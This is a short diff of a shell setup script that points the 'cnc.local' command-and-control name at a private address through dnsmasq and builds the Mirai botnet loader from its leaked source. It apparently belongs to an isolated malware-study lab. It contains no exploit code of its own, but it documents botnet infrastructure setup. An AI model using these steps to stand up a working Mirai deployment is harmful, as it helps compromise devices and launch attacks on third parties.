@@ -35,7 +35,7 @@ sudo sed -i 's/127.0.1.1.*/127.0.1.1       router/' /etc/hosts
 # Configure DNS
 sudo systemctl stop systemd-resolved
 sudo systemctl disable systemd-resolved
-echo "address=/cnc.local/172.31.19.53" | sudo tee -a /etc/dnsmasq.conf
+echo "address=/cnc.local/192.168.1.56" | sudo tee -a /etc/dnsmasq.conf
 sudo systemctl enable dnsmasq
 sudo systemctl start dnsmasq
 
@@ -369,7 +369,7 @@ sed -i 's/uint32_t_to_ip/uint32_to_ip/' main.c
 # Ajouter les headers
 sed -i '1i#include <ctype.h>\n#include <stdlib.h>\n#include <unistd.h>' util.c
 
-cd ~/Mirai-Source-Code/mirai/
+cd ~/Mirai-Source-Code/loader/
 # Try building with debugging (as in your original setup)
 gcc -lefence -g -DDEBUG -static -lpthread -pthread -O3 src/*.c -o ~/mirai/loader.dbg
 
